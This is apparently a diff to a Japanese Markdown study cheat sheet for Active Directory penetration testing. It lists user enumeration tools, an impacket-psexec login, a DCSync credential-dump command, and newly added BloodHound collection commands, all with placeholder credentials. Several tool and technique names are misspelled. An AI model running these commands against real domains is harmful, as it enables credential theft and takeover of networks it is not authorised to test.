@@ -11,7 +11,6 @@
 <br>
 
 #### 1. 偵察・情報収集（Reconnaissance）/ 2. 初期侵入（Inital Access）
------
 - ユーザ名の列挙
   - 手法：Kerberos Pre-Authentication、LDAL匿名バインド、SMB Null Session
   - ツール：kerbrute、enum4linux、crackmapexec
@@ -96,4 +95,17 @@ impacket-psexec corp.local/USER:PASSWORD@<IP> # SMB経由
 - DCSynx攻撃
 ```bash
 impacket-secretdump corp.local/svc_admin:PASSWORD@<IP>
+```
+
+-----
+### BloodHound
+AD環境の権限関係を可視化するツール
+```bash
+# BloodHound起動
+bloodhound
+```
+
+- 情報収集
+```bash
+bloodhound-python -u USER -p PASSWORD -d corp.local -ns <IP> -c ALL
 ```
